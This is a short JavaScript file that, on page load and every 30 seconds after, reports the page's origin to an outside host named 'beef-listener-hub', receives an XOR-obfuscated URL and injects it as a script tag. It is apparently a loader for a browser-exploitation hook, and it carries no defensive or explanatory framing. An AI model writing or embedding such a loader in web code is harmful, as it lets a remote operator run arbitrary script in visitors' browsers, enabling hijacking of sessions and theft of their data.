const key       = "my_secret_key";
const origin = "https://beef-listener-hub.onrender.com";
let status = "idle";
let request = true;

function xorDecode(encoded, key) {
  const text = atob(encoded);
  let result = "";
  for (let i = 0; i < text.length; i++) result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  return result;
}

function loadListenerScript(scriptUrl) {
  try { new URL(scriptUrl); } catch {
    console.warn("Invalid listener URL:", scriptUrl);
    return;
  }

  if (document.querySelector(`script[src="${scriptUrl}"]`)) return;

  const script  = document.createElement("script");
  script.src    = scriptUrl;
  script.async  = true;

  script.onload = () => {
    console.log("Listener script loaded:", scriptUrl);
    request = (status === "active") ? false : true;
    status = "active";
  };

  script.onerror = () => {
    console.warn("Listener script failed, removing:", scriptUrl);
    script.remove();
  };
  document.head.appendChild(script);
}


function getListener() {
    async function fetchListener() {
        try {
            if(!request) return;
            const response = await fetch(origin + "/api/route",
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                    FROM: window.location.origin,
                    KEY: key,
                    STATUS: status
                    })
                }
            );

            if (!response.ok) throw new Error(`HTTP ${response.status}`);

            const data = await response.json();
            const listenerUrl = data.listener;

            if (!listenerUrl) {
                console.warn("No listener available");
                return;
            }
            console.log("Received listener URL:", listenerUrl);
            loadListenerScript(xorDecode(listenerUrl, key));
        } catch (err) {
            console.error("Failed to communicate with server:",err);
        }
    }

  fetchListener();
  return setInterval(fetchListener, 30 * 1000);
}

const timer = getListener();

window.addEventListener("beforeunload", () => {
    console.log("PAGE RELOAD DETECTED");
});